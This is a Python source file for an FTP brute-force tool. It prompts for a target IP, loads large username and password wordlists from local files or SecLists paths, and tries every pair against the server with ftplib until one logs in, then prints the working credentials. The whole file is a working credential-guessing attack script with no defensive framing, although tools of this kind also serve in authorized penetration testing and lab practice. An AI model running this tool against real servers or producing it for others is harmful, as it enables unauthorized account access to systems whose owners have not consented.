import ftplib
import time
import progressbar


def get_usernames_wordlist():
    try:
        users = open('usuarios.txt', 'r')
        users = users.read().split('\n')
    except:
        users = []
    
    if not users:
        users = open('/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt', 'r', encoding='utf-8', errors='ignore')
        users = users.read().split('\n')
        
    return users
        
def get_passwd_wordlist():
    try:
        passwords = open('passwords.txt', 'r')
        passwords = passwords.read().split('\n')
    except:
        passwords = []
    
    if not passwords:
        passwords = open('/usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt', 'r', encoding='utf-8', errors='ignore')
        passwords = passwords.read().split('\n')
    
    return passwords


def ftp_attack(ip: str, username: str, password: str):
    ftp = ftplib.FTP(ip)
    
    try:
        ftp.login(username, password)
        ftp.quit()
    except:
        return False
    return True



def main():
    ip = input('Type the IP -> ')

    if 'y' in input('Do you know the user? (y/n) -> ').lower():
        users = [input('Type the username that you know -> ')]
    else:
        users = get_usernames_wordlist()
    if 'y' in input('Do you know the password? (y/n) -> ').lower():
        passwords = [input('Type the password that you know -> ')]
    else:
        passwords = get_passwd_wordlist()
        
    widgets = [
        'Progress: ',
        progressbar.Percentage(),
        ' ',                              
        progressbar.Bar(marker=':'),
        ' ',
        progressbar.ETA(),                    # Estimated time remaining
        ' | ',
        progressbar.Counter('%d/' + str(len(users) * len(passwords))),
        ' || ',
        progressbar.Timer(),                  # Time elapsed
    ]
    
    try:
        bar = progressbar.ProgressBar(widgets=widgets, max_value=len(users) * len(passwords))
    except TypeError:
        bar = progressbar.ProgressBar(widgets=widgets, maxval=len(users) * len(passwords))
    
    bar = bar.start()
    
    def update_bar(value):
        try:
            bar.update(value)
        except AttributeError:
            bar(value)
    
    count = 0
    exit_for = False
    for possible_username in users:
        for possible_passwd in passwords:
            count += 1
            update_bar(count)
            time.sleep(0.00007)
            
            if ftp_attack(ip, possible_username, possible_passwd):
                print(f"¡¡SUCCESFULL LOGIN!! The user is '{possible_username}' and the password is '{possible_passwd}'")
                exit_for = True
                break
        if exit_for:
            break
    
    try:
        bar.finish()
    except Exception:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n(Bye...)\n')